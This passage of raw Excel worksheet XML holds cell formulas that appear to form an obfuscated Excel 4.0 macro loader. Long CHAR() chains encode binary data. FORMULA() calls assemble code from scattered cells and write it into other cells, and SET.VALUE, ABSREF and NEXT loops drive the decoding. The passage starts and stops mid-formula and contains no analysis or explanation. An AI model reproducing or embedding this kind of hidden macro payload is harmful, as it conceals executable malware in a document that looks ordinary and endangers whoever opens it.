9)&amp;CHAR(82)&amp;CHAR(68)&amp;CHAR(215)&amp;CHAR(4)&amp;CHAR(26)&amp;CHAR(214)&amp;CHAR(172)&amp;CHAR(253)&amp;CHAR(219)&amp;CHAR(132)&amp;CHAR(31)&amp;CHAR(68)&amp;CHAR(219)&amp;CHAR(198)&amp;CHAR(74)&amp;CHAR(73)&amp;CHAR(99)&amp;CHAR(221)&amp;CHAR(215)&amp;CHAR(118)&amp;CHAR(197)&amp;CHAR(27)&amp;CHAR(238)&amp;CHAR(151)&amp;CHAR(39)&amp;CHAR(103)&amp;CHAR(255)&amp;CHAR(10)&amp;CHAR(98)&amp;CHAR(190)&amp;CHAR(183)&amp;CHAR(231)&amp;CHAR(27)&amp;CHAR(164)&amp;CHAR(36)&amp;CHAR(14)&amp;CHAR(82)&amp;CHAR(62)&amp;CHAR(37)&amp;CHAR(33)&amp;CHAR(42)&amp;CHAR(66)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(204)&amp;CHAR(157)&amp;CHAR(133)&amp;CHAR(133)&amp;CHAR(119)&amp;CHAR(65)&amp;CHAR(42)&amp;CHAR(33)&amp;CHAR(162)&amp;CHAR(205)&amp;CHAR(195)&amp;CHAR(239)&amp;CHAR(65)&amp;CHAR(144)&amp;CHAR(178)&amp;CHAR(125)&amp;CHAR(202)&amp;CHAR(17)&amp;CHAR(216)&amp;CHAR(227)&amp;CHAR(129)&amp;CHAR(24)&amp;CHAR(134)&amp;CHAR(109)&amp;CHAR(246)&amp;CHAR(38)&amp;CHAR(202)&amp;CHAR(19)&amp;CHAR(181)&amp;CHAR(176)&amp;CHAR(14)&amp;CHAR(171)&amp;CHAR(30)&amp;CHAR(224)&amp;CHAR(45)&amp;CHAR(21)&amp;CHAR(204)&amp;CHAR(198)&amp;CHAR(142)&amp;CHAR(183)&amp;CHAR(83)&amp;CHAR(242)&amp;CHAR(76)&amp;CHAR(145)&amp;CHAR(83)&amp;CHAR(54)&amp;CHAR(124)&amp;CHAR(177)&amp;CHAR(161)&amp;CHAR(92)&amp;CHAR(24)&amp;CHAR(15)&amp;CHAR(31)&amp;CHAR(161)&amp;CHAR(87)&amp;CHAR(223)&amp;CHAR(31)&amp;CHAR(165)&amp;CHAR(98)&amp;CHAR(4)&amp;CHAR(125)&amp;CHAR(1)&amp;CHAR(157)&amp;CHAR(151)&amp;CHAR(46)&amp;CHAR(44)&amp;CHAR(38)&amp;CHAR(121)&amp;CHAR(200)&amp;CHAR(36)&amp;CHAR(35)&amp;CHAR(180)&amp;CHAR(177)&amp;CHAR(98)&amp;CHAR(44)&amp;CHAR(145)&amp;CHAR(170)&amp;CHAR(221)&amp;CHAR(31)&amp;CHAR(10)&amp;CHAR(208)&amp;CHAR(42)&amp;CHAR(57)&amp;CHAR(49)&amp;CHAR(186)&amp;CHAR(143)&amp;CHAR(55)&amp;CHAR(95)&amp;CHAR(214)&amp;CHAR(8)&amp;CHAR(152)&amp;CHAR(79)&amp;CHAR(142)&amp;CHAR(170)&amp;CHAR(173)&amp;CHAR(27)&amp;CHAR(195)&amp;CHAR(92)&amp;CHAR(236)&amp;CHAR(170)&amp;CHAR(53)</f>
        <v>’¶Ñ_x0013_ÓQ/cý¤œ_x0001_r_Þ_x0013_HÑ‚_x001F__x0004_o\(B!J¤;_x0008_5;M_x0002_®²ºv7 ÏÂÍæcZ_x0012_?)÷žè_x0013_cµC4m_x0005_Jd„f0¢Ä_x0019_Ì+_x001C_¢É*·Î$~z¢_x0014_±q¢_x0018_,TrÜ^†co8Öµóár_x0010__x0005_6_x0001_õ
%'RD×_x0004__x001A_Ö¬ýÛ„_x001F_DÛÆJIcÝ×vÅ_x001B_î—'gÿ
b¾·ç_x001B_¤$_x000E_R&gt;%!*BÀ³Ì……wA*!¢ÍÃïA²}Ê_x0011_Øã_x0018_†mö&amp;Ê_x0013_µ°_x000E_«_x001E_à-_x0015_ÌÆŽ·SòL‘S6|±¡\_x0018__x000F__x001F_¡Wß_x001F_¥b_x0004_}_x0001_—.,&amp;yÈ$#´±b,‘ªÝ_x001F_
Ð*91º7_Ö_x0008_˜OŽª­_x001B_Ã\ìª5</v>
      </c>
      <c r="DG35" t="str">
        <f>CHAR(78)&amp;CHAR(80)&amp;CHAR(219)&amp;CHAR(39)&amp;CHAR(157)&amp;CHAR(11)&amp;CHAR(134)&amp;CHAR(88)&amp;CHAR(247)&amp;CHAR(85)</f>
        <v>NPÛ'_x000B_†X÷U</v>
      </c>
      <c r="DH35" t="s">
        <v>34</v>
      </c>
      <c r="DJ35" t="b">
        <f>SET.VALUE($DI$1,$DI$1+1)</f>
        <v>1</v>
      </c>
    </row>
    <row r="36" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE36" t="b">
        <f>FORMULA(DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH65&amp;DH27&amp;DH28&amp;DH45&amp;DH44&amp;DH31&amp;DH32&amp;DH66&amp;DH68&amp;DH44&amp;DH63&amp;DH54&amp;DH64&amp;DH29&amp;DH68&amp;DH76&amp;DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH67,DJ36)</f>
        <v>1</v>
      </c>
      <c r="DF36" t="str">
        <f>CHAR(234)&amp;CHAR(87)&amp;CHAR(96)&amp;CHAR(143)&amp;CHAR(105)&amp;CHAR(212)&amp;CHAR(198)&amp;CHAR(168)&amp;CHAR(90)&amp;CHAR(135)&amp;CHAR(116)&amp;CHAR(247)&amp;CHAR(195)&amp;CHAR(51)&amp;CHAR(19)&amp;CHAR(186)&amp;CHAR(146)&amp;CHAR(54)&amp;CHAR(174)&amp;CHAR(112)&amp;CHAR(132)&amp;CHAR(255)&amp;CHAR(154)&amp;CHAR(243)&amp;CHAR(166)&amp;CHAR(120)&amp;CHAR(137)&amp;CHAR(153)&amp;CHAR(69)&amp;CHAR(227)&amp;CHAR(197)&amp;CHAR(201)&amp;CHAR(92)&amp;CHAR(95)&amp;CHAR(214)&amp;CHAR(198)&amp;CHAR(239)&amp;CHAR(224)&amp;CHAR(213)&amp;CHAR(222)&amp;CHAR(44)&amp;CHAR(25)&amp;CHAR(238)&amp;CHAR(242)&amp;CHAR(1)&amp;CHAR(46)&amp;CHAR(198)&amp;CHAR(245)&amp;CHAR(249)&amp;CHAR(43)&amp;CHAR(50)&amp;CHAR(240)&amp;CHAR(116)&amp;CHAR(55)&amp;CHAR(138)&amp;CHAR(151)&amp;CHAR(231)&amp;CHAR(160)&amp;CHAR(223)&amp;CHAR(136)&amp;CHAR(92)&amp;CHAR(116)&amp;CHAR(178)&amp;CHAR(109)&amp;CHAR(192)&amp;CHAR(35)&amp;CHAR(95)&amp;CHAR(172)&amp;CHAR(209)&amp;CHAR(89)&amp;CHAR(53)&amp;CHAR(93)&amp;CHAR(144)&amp;CHAR(172)&amp;CHAR(5)&amp;CHAR(165)&amp;CHAR(215)&amp;CHAR(45)&amp;CHAR(233)&amp;CHAR(145)&amp;CHAR(110)&amp;CHAR(94)&amp;CHAR(145)&amp;CHAR(174)&amp;CHAR(69)&amp;CHAR(46)&amp;CHAR(70)&amp;CHAR(229)&amp;CHAR(53)&amp;CHAR(39)&amp;CHAR(161)&amp;CHAR(99)&amp;CHAR(197)&amp;CHAR(84)&amp;CHAR(204)&amp;CHAR(252)&amp;CHAR(4)&amp;CHAR(152)&amp;CHAR(127)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(193)&amp;CHAR(50)&amp;CHAR(29)&amp;CHAR(205)&amp;CHAR(162)&amp;CHAR(213)&amp;CHAR(230)&amp;CHAR(90)&amp;CHAR(202)&amp;CHAR(245)&amp;CHAR(158)&amp;CHAR(146)&amp;CHAR(132)&amp;CHAR(223)&amp;CHAR(49)&amp;CHAR(6)&amp;CHAR(97)&amp;CHAR(154)&amp;CHAR(150)&amp;CHAR(86)&amp;CHAR(47)&amp;CHAR(18)&amp;CHAR(152)&amp;CHAR(19)&amp;CHAR(132)&amp;CHAR(98)&amp;CHAR(43)&amp;CHAR(118)&amp;CHAR(59)&amp;CHAR(56)&amp;CHAR(124)&amp;CHAR(150)&amp;CHAR(86)&amp;CHAR(211)&amp;CHAR(167)&amp;CHAR(68)&amp;CHAR(149)&amp;CHAR(120)&amp;CHAR(47)&amp;CHAR(224)&amp;CHAR(200)&amp;CHAR(233)&amp;CHAR(192)&amp;CHAR(134)&amp;CHAR(188)&amp;CHAR(103)&amp;CHAR(194)&amp;CHAR(116)&amp;CHAR(162)&amp;CHAR(133)&amp;CHAR(104)&amp;CHAR(1)&amp;CHAR(144)&amp;CHAR(187)&amp;CHAR(51)&amp;CHAR(253)&amp;CHAR(155)&amp;CHAR(241)&amp;CHAR(141)&amp;CHAR(37)&amp;CHAR(136)&amp;CHAR(223)&amp;CHAR(80)&amp;CHAR(202)&amp;CHAR(233)&amp;CHAR(57)&amp;CHAR(12)&amp;CHAR(139)&amp;CHAR(167)&amp;CHAR(54)&amp;CHAR(11)&amp;CHAR(252)&amp;CHAR(216)&amp;CHAR(66)&amp;CHAR(100)&amp;CHAR(12)&amp;CHAR(187)&amp;CHAR(189)&amp;CHAR(201)&amp;CHAR(72)&amp;CHAR(98)&amp;CHAR(135)&amp;CHAR(67)&amp;CHAR(230)&amp;CHAR(106)&amp;CHAR(12)&amp;CHAR(152)&amp;CHAR(159)&amp;CHAR(143)&amp;CHAR(12)&amp;CHAR(119)&amp;CHAR(49)&amp;CHAR(109)&amp;CHAR(78)&amp;CHAR(116)&amp;CHAR(165)&amp;CHAR(8)&amp;CHAR(16)&amp;CHAR(97)&amp;CHAR(226)&amp;CHAR(48)&amp;CHAR(137)&amp;CHAR(109)&amp;CHAR(7)&amp;CHAR(108)&amp;CHAR(38)&amp;CHAR(74)&amp;CHAR(251)&amp;CHAR(221)&amp;CHAR(128)&amp;CHAR(142)&amp;CHAR(51)&amp;CHAR(188)&amp;CHAR(42)&amp;CHAR(167)&amp;CHAR(93)&amp;CHAR(173)&amp;CHAR(23)&amp;CHAR(167)&amp;CHAR(220)&amp;CHAR(202)&amp;CHAR(88)&amp;CHAR(186)&amp;CHAR(236)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(79)&amp;CHAR(126)&amp;CHAR(159)&amp;CHAR(124)&amp;CHAR(163)&amp;CHAR(145)&amp;CHAR(19)&amp;CHAR(228)&amp;CHAR(163)&amp;CHAR(51)&amp;CHAR(169)&amp;CHAR(125)&amp;CHAR(47)&amp;CHAR(173)&amp;CHAR(218)&amp;CHAR(103)&amp;CHAR(230)&amp;CHAR(41)&amp;CHAR(238)&amp;CHAR(159)&amp;CHAR(34)&amp;CHAR(152)&amp;CHAR(161)&amp;CHAR(100)&amp;CHAR(133)&amp;CHAR(49)&amp;CHAR(205)&amp;CHAR(209)</f>
        <v>êW`iÔÆ¨Z‡t÷Ã3_x0013_º’6®p„ÿšó¦x‰™EãÅÉ\_ÖÆïàÕÞ,_x0019_îò_x0001_.Æõù+2ðt7Š—ç ßˆ\t²mÀ#_¬ÑY5]¬_x0005_¥×-é‘n^‘®E.Få5'¡cÅTÌü_x0004_˜_x000C__x0004_Á2_x001D_Í¢ÕæZÊõž’„ß1_x0006_aš–V/_x0012_˜_x0013_„b+v;8|–VÓ§D•x/àÈéÀ†¼gÂt¢…h_x0001_»3ý›ñ%ˆßPÊé9_x000C_‹§6_x000B_üØBd_x000C_»½ÉHb‡Cæj_x000C_˜Ÿ_x000C_w1mNt¥_x0008__x0010_aâ0‰m_x0007_l&amp;JûÝ€Ž3¼*§]­_x0017_§ÜÊXºì_x0003__x0003_O~Ÿ|£‘_x0013_ä£3©}/­Úgæ)îŸ"˜¡d…1ÍÑ</v>
      </c>
      <c r="DG36" t="str">
        <f>CHAR(219)&amp;CHAR(37)&amp;CHAR(60)&amp;CHAR(120)&amp;CHAR(52)&amp;CHAR(131)&amp;CHAR(96)&amp;CHAR(85)&amp;CHAR(83)&amp;CHAR(15)</f>
        <v>Û%&lt;x4ƒ`US_x000F_</v>
      </c>
      <c r="DH36" t="s">
        <v>35</v>
      </c>
      <c r="DJ36" t="b">
        <f bx="1">main=ABSREF("R[1]C",main)</f>
        <v>1</v>
      </c>
    </row>
    <row r="37" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE37" t="b">
        <f>FORMULA(DH65&amp;DH40&amp;DH31&amp;DH50&amp;DH46&amp;DH66&amp;DH67,DJ37)</f>
        <v>1</v>
      </c>
      <c r="DF37" t="str">
        <f>CHAR(137)&amp;CHAR(114)&amp;CHAR(146)&amp;CHAR(49)&amp;CHAR(8)&amp;CHAR(130)&amp;CHAR(219)&amp;CHAR(19)&amp;CHAR(110)&amp;CHAR(99)&amp;CHAR(188)&amp;CHAR(201)&amp;CHAR(50)&amp;CHAR(107)&amp;CHAR(161)&amp;CHAR(135)&amp;CHAR(64)&amp;CHAR(121)&amp;CHAR(222)&amp;CHAR(171)&amp;CHAR(37)&amp;CHAR(219)&amp;CHAR(123)&amp;CHAR(251)&amp;CHAR(59)&amp;CHAR(96)&amp;CHAR(182)&amp;CHAR(173)&amp;CHAR(95)&amp;CHAR(59)&amp;CHAR(244)&amp;CHAR(200)&amp;CHAR(105)&amp;CHAR(109)&amp;CHAR(41)&amp;CHAR(58)&amp;CHAR(205)&amp;CHAR(117)&amp;CHAR(232)&amp;CHAR(165)&amp;CHAR(169)&amp;CHAR(109)&amp;CHAR(190)&amp;CHAR(138)&amp;CHAR(4)&amp;CHAR(146)&amp;CHAR(165)&amp;CHAR(11)&amp;CHAR(83)&amp;CHAR(115)&amp;CHAR(226)&amp;CHAR(124)&amp;CHAR(178)&amp;CHAR(131)&amp;CHAR(249)&amp;CHAR(77)&amp;CHAR(114)&amp;CHAR(50)&amp;CHAR(112)&amp;CHAR(47)&amp;CHAR(221)&amp;CHAR(242)&amp;CHAR(254)&amp;CHAR(43)&amp;CHAR(139)&amp;CHAR(219)&amp;CHAR(116)&amp;CHAR(111)&amp;CHAR(76)&amp;CHAR(40)&amp;CHAR(109)&amp;CHAR(13)&amp;CHAR(33)&amp;CHAR(236)&amp;CHAR(195)&amp;CHAR(181)&amp;CHAR(129)&amp;CHAR(104)&amp;CHAR(188)&amp;CHAR(194)&amp;CHAR(63)&amp;CHAR(102)&amp;CHAR(180)&amp;CHAR(102)&amp;CHAR(32)&amp;CHAR(219)&amp;CHAR(25)&amp;CHAR(26)&amp;CHAR(151)&amp;CHAR(84)&amp;CHAR(163)&amp;CHAR(148)&amp;CHAR(3)&amp;CHAR(127)&amp;CHAR(248)&amp;CHAR(220)&amp;CHAR(104)&amp;CHAR(164)&amp;CHAR(198)&amp;CHAR(198)&amp;CHAR(70)&amp;CHAR(214)&amp;CHAR(241)&amp;CHAR(34)&amp;CHAR(105)&amp;CHAR(174)&amp;CHAR(38)&amp;CHAR(119)&amp;CHAR(84)&amp;CHAR(241)&amp;CHAR(149)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(225)&amp;CHAR(140)&amp;CHAR(116)&amp;CHAR(27)&amp;CHAR(135)&amp;CHAR(218)&amp;CHAR(152)&amp;CHAR(26)&amp;CHAR(227)&amp;CHAR(237)&amp;CHAR(218)&amp;CHAR(220)&amp;CHAR(136)&amp;CHAR(218)&amp;CHAR(105)&amp;CHAR(105)&amp;CHAR(82)&amp;CHAR(16)&amp;CHAR(72)&amp;CHAR(163)&amp;CHAR(31)&amp;CHAR(155)&amp;CHAR(176)&amp;CHAR(83)&amp;CHAR(104)&amp;CHAR(68)&amp;CHAR(163)&amp;CHAR(191)&amp;CHAR(1)&amp;CHAR(8)&amp;CHAR(184)&amp;CHAR(147)&amp;CHAR(38)&amp;CHAR(150)&amp;CHAR(97)&amp;CHAR(93)&amp;CHAR(229)&amp;CHAR(208)&amp;CHAR(68)&amp;CHAR(166)&amp;CHAR(73)&amp;CHAR(105)&amp;CHAR(255)&amp;CHAR(192)&amp;CHAR(116)&amp;CHAR(139)&amp;CHAR(109)&amp;CHAR(33)&amp;CHAR(22)&amp;CHAR(124)&amp;CHAR(217)&amp;CHAR(27)&amp;CHAR(120)&amp;CHAR(240)&amp;CHAR(190)&amp;CHAR(46)&amp;CHAR(171)&amp;CHAR(92)&amp;CHAR(132)&amp;CHAR(89)&amp;CHAR(169)&amp;CHAR(233)&amp;CHAR(29)&amp;CHAR(254)&amp;CHAR(135)&amp;CHAR(125)&amp;CHAR(76)&amp;CHAR(94)&amp;CHAR(225)&amp;CHAR(240)&amp;CHAR(175)&amp;CHAR(14)&amp;CHAR(120)&amp;CHAR(242)&amp;CHAR(160)&amp;CHAR(212)&amp;CHAR(93)&amp;CHAR(157)&amp;CHAR(44)&amp;CHAR(183)&amp;CHAR(212)&amp;CHAR(248)&amp;CHAR(93)&amp;CHAR(171)&amp;CHAR(142)&amp;CHAR(136)&amp;CHAR(123)&amp;CHAR(27)&amp;CHAR(9)&amp;CHAR(246)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(33)&amp;CHAR(161)&amp;CHAR(197)&amp;CHAR(6)&amp;CHAR(131)&amp;CHAR(85)&amp;CHAR(191)&amp;CHAR(134)&amp;CHAR(242)&amp;CHAR(221)&amp;CHAR(59)&amp;CHAR(83)&amp;CHAR(41)&amp;CHAR(210)&amp;CHAR(92)&amp;CHAR(60)&amp;CHAR(1)&amp;CHAR(129)&amp;CHAR(61)&amp;CHAR(152)&amp;CHAR(73)&amp;CHAR(144)&amp;CHAR(158)&amp;CHAR(15)&amp;CHAR(248)&amp;CHAR(215)&amp;CHAR(1)&amp;CHAR(166)&amp;CHAR(33)&amp;CHAR(100)&amp;CHAR(145)&amp;CHAR(81)&amp;CHAR(241)&amp;CHAR(206)&amp;CHAR(229)&amp;CHAR(16)&amp;CHAR(189)&amp;CHAR(74)&amp;CHAR(162)&amp;CHAR(100)&amp;CHAR(253)&amp;CHAR(23)&amp;CHAR(217)&amp;CHAR(237)&amp;CHAR(143)&amp;CHAR(155)&amp;CHAR(61)&amp;CHAR(100)&amp;CHAR(40)&amp;CHAR(178)</f>
        <v>‰r’1_x0008_‚Û_x0013_nc¼É2k¡‡@yÞ«%Û{û;`¶­_;ôÈim):Íuè¥©m¾Š_x0004_’¥_x000B_Ssâ|²ƒùMr2p/Ýòþ+‹ÛtoL(m_x000D_!ìÃµh¼Â?f´f Û_x0019__x001A_—T£”_x0003_øÜh¤ÆÆFÖñ"i®&amp;wTñ•Ê|áŒt_x001B_‡Ú˜_x001A_ãíÚÜˆÚiiR_x0010_H£_x001F_›°ShD£¿_x0001__x0008_¸“&amp;–a]åÐD¦IiÿÀt‹m!_x0016_|Ù_x001B_xð¾.«\„Y©é_x001D_þ‡}L^áð¯_x000E_xò Ô],·Ôø]«Žˆ{_x001B_	ö4Í!¡Å_x0006_ƒU¿†òÝ;S)Ò\&lt;_x0001_=˜Iž_x000F_ø×_x0001_¦!d‘QñÎå_x0010_½J¢dý_x0017_Ùí›=d(²</v>
      </c>
      <c r="DG37" t="str">
        <f>CHAR(156)&amp;CHAR(15)&amp;CHAR(202)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(65)&amp;CHAR(118)&amp;CHAR(255)&amp;CHAR(157)&amp;CHAR(13)</f>
        <v>œ_x000F_Ê4_x0014_Avÿ_x000D_</v>
      </c>
      <c r="DH37" t="s">
        <v>36</v>
      </c>
      <c r="DJ37" t="b">
        <f>NEXT()</f>
        <v>1</v>
      </c>
    </row>
    <row r="38" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE38" t="b">
        <f>FORMULA(DH65&amp;DH43&amp;DH21&amp;DH5&amp;DH21&amp;DH5&amp;DH66&amp;DH44&amp;DH55&amp;DH55&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH76&amp;DH75&amp;DH55&amp;DH76&amp;DH53&amp;DH67,DJ38)</f>
        <v>1</v>
      </c>
      <c r="DF38" t="str">
        <f>CHAR(38)&amp;CHAR(85)&amp;CHAR(197)&amp;CHAR(207)&amp;CHAR(20)&amp;CHAR(59)&amp;CHAR(147)&amp;CHAR(61)&amp;CHAR(17)&amp;CHAR(139)&amp;CHAR(89)&amp;CHAR(232)&amp;CHAR(237)&amp;CHAR(59)&amp;CHAR(84)&amp;CHAR(32)&amp;CHAR(11)&amp;CHAR(205)&amp;CHAR(89)&amp;CHAR(70)&amp;CHAR(220)&amp;CHAR(192)&amp;CHAR(158)&amp;CHAR(113)&amp;CHAR(112)&amp;CHAR(157)&amp;CHAR(223)&amp;CHAR(43)&amp;CHAR(126)&amp;CHAR(49)&amp;CHAR(136)&amp;CHAR(159)&amp;CHAR(35)&amp;CHAR(144)&amp;CHAR(211)&amp;CHAR(8)&amp;CHAR(40)&amp;CHAR(32)&amp;CHAR(244)&amp;CHAR(211)&amp;CHAR(86)&amp;CHAR(33)&amp;CHAR(198)&amp;CHAR(55)&amp;CHAR(183)&amp;CHAR(121)&amp;CHAR(35)&amp;CHAR(171)&amp;CHAR(51)&amp;CHAR(234)&amp;CHAR(15)&amp;CHAR(174)&amp;CHAR(45)&amp;CHAR(13)&amp;CHAR(9)&amp;CHAR(51)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(147)&amp;CHAR(28)&amp;CHAR(148)&amp;CHAR(104)&amp;CHAR(48)&amp;CHAR(251)&amp;CHAR(239)&amp;CHAR(3)&amp;CHAR(57)&amp;CHAR(3)&amp;CHAR(234)&amp;CHAR(241)&amp;CHAR(32)&amp;CHAR(116)&amp;CHAR(19)&amp;CHAR(76)&amp;CHAR(2)&amp;CHAR(38)&amp;CHAR(149)&amp;CHAR(108)&amp;CHAR(24)&amp;CHAR(109)&amp;CHAR(20)&amp;CHAR(102)&amp;CHAR(85)&amp;CHAR(159)&amp;CHAR(89)&amp;CHAR(219)&amp;CHAR(56)&amp;CHAR(39)&amp;CHAR(181)&amp;CHAR(189)&amp;CHAR(116)&amp;CHAR(114)&amp;CHAR(121)&amp;CHAR(133)&amp;CHAR(66)&amp;CHAR(134)&amp;CHAR(18)&amp;CHAR(118)&amp;CHAR(156)&amp;CHAR(125)&amp;CHAR(52)&amp;CHAR(56)&amp;CHAR(38)&amp;CHAR(189)&amp;CHAR(227)&amp;CHAR(124)&amp;CHAR(156)&amp;CHAR(65)&amp;CHAR(28)&amp;CHAR(18)&amp;CHAR(133)&amp;CHAR(224)&amp;CHAR(212)&amp;CHAR(102)&amp;CHAR(111)&amp;CHAR(246)&amp;CHAR(123)&amp;CHAR(42)&amp;CHAR(108)&amp;CHAR(103)&amp;CHAR(132)&amp;CHAR(116)&amp;CHAR(21)&amp;CHAR(138)&amp;CHAR(41)&amp;CHAR(149)&amp;CHAR(115)&amp;CHAR(230)&amp;CHAR(147)&amp;CHAR(201)&amp;CHAR(241)&amp;CHAR(212)&amp;CHAR(237)&amp;CHAR(206)&amp;CHAR(191)&amp;CHAR(210)&amp;CHAR(52)&amp;CHAR(253)&amp;CHAR(212)&amp;CHAR(180)&amp;CHAR(243)&amp;CHAR(44)&amp;CHAR(158)&amp;CHAR(22)&amp;CHAR(54)&amp;CHAR(181)&amp;CHAR(217)&amp;CHAR(6)&amp;CHAR(98)&amp;CHAR(96)&amp;CHAR(234)&amp;CHAR(81)&amp;CHAR(7)&amp;CHAR(90)&amp;CHAR(2)&amp;CHAR(27)&amp;CHAR(182)&amp;CHAR(128)&amp;CHAR(128)&amp;CHAR(253)&amp;CHAR(186)&amp;CHAR(92)&amp;CHAR(182)&amp;CHAR(222)&amp;CHAR(9)&amp;CHAR(59)&amp;CHAR(23)&amp;CHAR(164)&amp;CHAR(76)&amp;CHAR(144)&amp;CHAR(208)&amp;CHAR(134)&amp;CHAR(208)&amp;CHAR(56)&amp;CHAR(245)&amp;CHAR(95)&amp;CHAR(206)&amp;CHAR(26)&amp;CHAR(87)&amp;CHAR(98)&amp;CHAR(248)&amp;CHAR(153)&amp;CHAR(139)&amp;CHAR(180)&amp;CHAR(167)&amp;CHAR(160)&amp;CHAR(23)&amp;CHAR(191)&amp;CHAR(201)&amp;CHAR(48)&amp;CHAR(209)&amp;CHAR(84)&amp;CHAR(119)&amp;CHAR(71)&amp;CHAR(255)&amp;CHAR(219)&amp;CHAR(105)&amp;CHAR(231)&amp;CHAR(211)&amp;CHAR(36)&amp;CHAR(222)&amp;CHAR(121)&amp;CHAR(135)&amp;CHAR(102)&amp;CHAR(38)&amp;CHAR(99)&amp;CHAR(81)&amp;CHAR(17)&amp;CHAR(203)&amp;CHAR(5)&amp;CHAR(158)&amp;CHAR(26)&amp;CHAR(68)&amp;CHAR(33)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(51)&amp;CHAR(5)&amp;CHAR(127)&amp;CHAR(186)&amp;CHAR(170)&amp;CHAR(137)&amp;CHAR(32)&amp;CHAR(18)&amp;CHAR(186)&amp;CHAR(167)&amp;CHAR(131)&amp;CHAR(101)&amp;CHAR(86)&amp;CHAR(46)&amp;CHAR(58)&amp;CHAR(125)&amp;CHAR(162)&amp;CHAR(47)&amp;CHAR(158)&amp;CHAR(209)&amp;CHAR(171)&amp;CHAR(186)&amp;CHAR(41)&amp;CHAR(133)&amp;CHAR(121)&amp;CHAR(79)&amp;CHAR(205)&amp;CHAR(22)&amp;CHAR(139)&amp;CHAR(102)&amp;CHAR(38)&amp;CHAR(203)&amp;CHAR(38)&amp;CHAR(142)&amp;CHAR(220)&amp;CHAR(134)&amp;CHAR(223)&amp;CHAR(215)&amp;CHAR(225)</f>
        <v>&amp;UÅÏ_x0014_;“=_x0011_‹Yèí;T _x000B_ÍYFÜÀžqpß+~1ˆŸ#Ó_x0008_( ôÓV!Æ7·y#«3ê_x000F_®-_x000D_	3Ê‰“_x001C_”h0ûï_x0003_9_x0003_êñ t_x0013_L_x0002_&amp;•l_x0018_m_x0014_fUŸYÛ8'µ½try…B†_x0012_vœ}48&amp;½ã|œA_x001C__x0012_…àÔfoö{*lg„t_x0015_Š)•sæ“ÉñÔíÎ¿Ò4ýÔ´ó,ž_x0016_6µÙ_x0006_b`êQ_x0007_Z_x0002__x001B_¶€€ýº\¶Þ	;_x0017_¤LÐ†Ð8õ_Î_x001A_Wbø™‹´§ _x0017_¿É0ÑTwGÿÛiçÓ$Þy‡f&amp;cQ_x0011_Ë_x0005_ž_x001A_D!×†3_x0005_ºª‰ _x0012_º§ƒeV.:}¢/žÑ«º)…yOÍ_x0016_‹f&amp;Ë&amp;ŽÜ†ß×á</v>
      </c>
      <c r="DG38" t="str">
        <f>CHAR(166)&amp;CHAR(88)&amp;CHAR(175)&amp;CHAR(85)&amp;CHAR(217)&amp;CHAR(171)&amp;CHAR(241)&amp;CHAR(190)&amp;CHAR(130)&amp;CHAR(247)</f>
        <v>¦X¯UÙ«ñ¾‚÷</v>
      </c>
      <c r="DH38" t="s">
        <v>37</v>
      </c>
      <c r="DJ38">
        <f>Queue($DJ$22,-2,0)</f>
        <v>1</v>
      </c>
    </row>
    <row r="39" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE39" t="b">
        <f>FORMULA(DH65&amp;DH33&amp;DH15&amp;DH66&amp;DH67,DJ39)</f>
        <v>1</v>
      </c>
      <c r="DF39" t="str">
        <f>CHAR(237)&amp;CHAR(129)&amp;CHAR(8)&amp;CHAR(199)&amp;CHAR(91)&amp;CHAR(231)&amp;CHAR(218)&amp;CHAR(148)&amp;CHAR(10)&amp;CHAR(195)&amp;CHAR(207)&amp;CHAR(219)&amp;CHAR(205)&amp;CHAR(215)&amp;CHAR(20)&amp;CHAR(168)&amp;CHAR(226)&amp;CHAR(166)&amp;CHAR(83)&amp;CHAR(206)&amp;CHAR(72)&amp;CHAR(109)&amp;CHAR(111)&amp;CHAR(137)&amp;CHAR(187)&amp;CHAR(51)&amp;CHAR(173)&amp;CHAR(227)&amp;CHAR(107)&amp;CHAR(175)&amp;CHAR(106)&amp;CHAR(199)&amp;CHAR(134)&amp;CHAR(7)&amp;CHAR(89)&amp;CHAR(178)&amp;CHAR(53)&amp;CHAR(70)&amp;CHAR(74)&amp;CHAR(74)&amp;CHAR(208)&amp;CHAR(236)&amp;CHAR(177)&amp;CHAR(175)&amp;CHAR(157)&amp;CHAR(245)&amp;CHAR(69)&amp;CHAR(82)&amp;CHAR(151)&amp;CHAR(42)&amp;CHAR(224)&amp;CHAR(174)&amp;CHAR(23)&amp;CHAR(6)&amp;CHAR(213)&amp;CHAR(59)&amp;CHAR(68)&amp;CHAR(173)&amp;CHAR(181)&amp;CHAR(132)&amp;CHAR(172)&amp;CHAR(176)&amp;CHAR(183)&amp;CHAR(77)&amp;CHAR(11)&amp;CHAR(80)&amp;CHAR(173)&amp;CHAR(233)&amp;CHAR(114)&amp;CHAR(214)&amp;CHAR(74)&amp;CHAR(138)&amp;CHAR(224)&amp;CHAR(222)&amp;CHAR(151)&amp;CHAR(218)&amp;CHAR(194)&amp;CHAR(4)&amp;CHAR(89)&amp;CHAR(55)&amp;CHAR(8)&amp;CHAR(253)&amp;CHAR(152)&amp;CHAR(220)&amp;CHAR(2)&amp;CHAR(145)&amp;CHAR(145)&amp;CHAR(146)&amp;CHAR(137)&amp;CHAR(152)&amp;CHAR(120)&amp;CHAR(225)&amp;CHAR(111)&amp;CHAR(189)&amp;CHAR(175)&amp;CHAR(103)&amp;CHAR(46)&amp;CHAR(197)&amp;CHAR(147)&amp;CHAR(224)&amp;CHAR(166)&amp;CHAR(134)&amp;CHAR(22)&amp;CHAR(237)&amp;CHAR(202)&amp;CHAR(99)&amp;CHAR(126)&amp;CHAR(92)&amp;CHAR(230)&amp;CHAR(41)&amp;CHAR(139)&amp;CHAR(134)&amp;CHAR(72)&amp;CHAR(152)&amp;CHAR(75)&amp;CHAR(147)&amp;CHAR(200)&amp;CHAR(144)&amp;CHAR(32)&amp;CHAR(42)&amp;CHAR